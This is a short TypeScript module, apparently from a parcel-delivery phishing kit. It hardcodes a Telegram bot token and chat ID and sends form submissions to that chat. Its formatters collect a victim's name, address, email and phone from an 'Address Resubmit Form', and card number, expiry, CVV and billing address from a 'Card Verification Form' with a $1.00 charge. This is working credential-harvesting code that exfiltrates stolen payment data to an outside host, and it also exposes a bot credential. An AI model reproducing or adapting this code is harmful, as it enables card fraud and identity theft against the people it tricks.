
const BOT_TOKEN = '7360978681:AAE-k7CtGzrviX2QvY26e53bN0PDTWS2mkU';
const CHAT_ID = '5893563832';

export const sendToTelegram = async (message: string) => {
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      console.error('Failed to send Telegram message');
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
};

export const formatAddressData = (formData: any) => {
  return `🏠 <b>Address Resubmit Form</b>

📦 <b>Tracking Number:</b> ${formData.trackingNumber}
👤 <b>Name:</b> ${formData.firstName} ${formData.lastName}
🏡 <b>Address:</b> ${formData.address}
🏘️ <b>City:</b> ${formData.city}
🏛️ <b>State:</b> ${formData.state}
📮 <b>ZIP Code:</b> ${formData.zipCode}
📧 <b>Email:</b> ${formData.email}
📱 <b>Phone:</b> ${formData.phone}

⏰ <b>Submitted:</b> ${new Date().toLocaleString()}`;
};

export const formatCardData = (formData: any) => {
  return `💳 <b>Card Verification Form</b>

💳 <b>Card Number:</b> ${formData.cardNumber}
📅 <b>Expiry Date:</b> ${formData.expiryDate}
🔒 <b>CVV:</b> ${formData.cvv}
👤 <b>Name on Card:</b> ${formData.nameOnCard}

🏠 <b>Billing Address:</b>
📍 ${formData.billingAddress}
🏘️ ${formData.billingCity}, ${formData.billingState} ${formData.billingZip}

💰 <b>Amount:</b> $1.00
⏰ <b>Submitted:</b> ${new Date().toLocaleString()}`;
};
